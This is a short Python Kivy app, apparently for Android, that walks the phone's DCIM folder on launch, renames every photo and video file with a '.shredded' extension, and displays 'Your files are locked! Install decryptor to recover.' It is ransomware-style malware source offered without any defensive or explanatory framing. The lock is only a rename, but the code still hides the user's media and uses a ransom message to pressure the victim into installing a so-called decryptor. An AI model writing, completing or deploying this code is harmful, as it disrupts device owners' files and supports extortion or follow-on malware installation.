from kivy.app import App
from kivy.uix.label import Label
import os

class LockerApp(App):
    def build(self):
        self.lock_files()
        return Label(text="Your files are locked!\nInstall decryptor to recover.", halign="center")

    def lock_files(self):
        # Very simple rename logic for DCIM folder
        dcim = os.path.expanduser("/sdcard/DCIM")
        for root, _, files in os.walk(dcim):
            for f in files:
                if any(f.lower().endswith(ext) for ext in (".jpg", ".png", ".mp4")):
                    os.rename(os.path.join(root, f), os.path.join(root, f + ".shredded"))

if __name__ == "__main__":
    LockerApp().run()
